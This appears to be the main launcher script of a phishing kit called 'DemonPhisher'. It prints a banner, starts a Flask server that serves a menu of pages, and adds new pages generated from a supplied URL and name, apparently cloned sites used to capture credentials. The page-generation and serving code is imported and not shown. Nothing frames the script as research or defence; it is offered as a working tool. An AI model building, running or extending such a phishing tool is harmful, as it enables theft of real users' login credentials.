from libs.FlaskApp import FlaskApp
from libs.Menu import menu
from libs.PageGenerator import generate_page
import sys


print (""" 					Welcome To
 ,'|"\    ,---.             .---.    .-. .-.    ,---.    .-. .-. ,-.    .---.  .-. .-.  ,---.   ,---.   
 | |\ \   | .-'   |\    /| / .-. )   |  \| |    | .-.\   | | | | |(|   ( .-._) | | | |  | .-'   | .-.\  
 | | \ \  | `-.   |(\  / | | | |(_)  |   | |    | |-' )  | `-' | (_)  (_) \    | `-' |  | `-.   | `-'/  
 | |  \ \ | .-'   (_)\/  | | | | |   | |\  |    | |--'   | .-. | | |  _  \ \   | .-. |  | .-'   |   (   
 /(|`-' / |  `--. | \  / | \ `-' /   | | |)|    | |      | | |)| | | ( `-'  )  | | |)|  |  `--. | |\ \  
(__)`--'  /( __.' | |\/| |  )---'    /(  (_)    /(       /(  (_) `-'  `----'   /(  (_)  /( __.' |_| \)\ 
         (__)     '-'  '-' (_)      (__)       (__)     (__)                  (__)     (__)         (__)

""")

def usage ():
    print("Usage: python DemonPhisher.py <command>")

def usage_add ():
    print ("Usage ADD: python DemonPhisher.py add <url> <name>")

if len (sys.argv) <= 1:
    usage()
elif (sys.argv[1] == "run"):
    FlaskApp(menu())
elif (sys.argv[1] == "add"):
    if len (sys.argv[2: ]) < 2:
        usage_add ()
    else:
        generate_page (sys.argv[2], sys.argv[3]);
        print ("[REMEBER]: After Manually Adding a page, you got to add an entry in the libs/Websites.py file manually.")
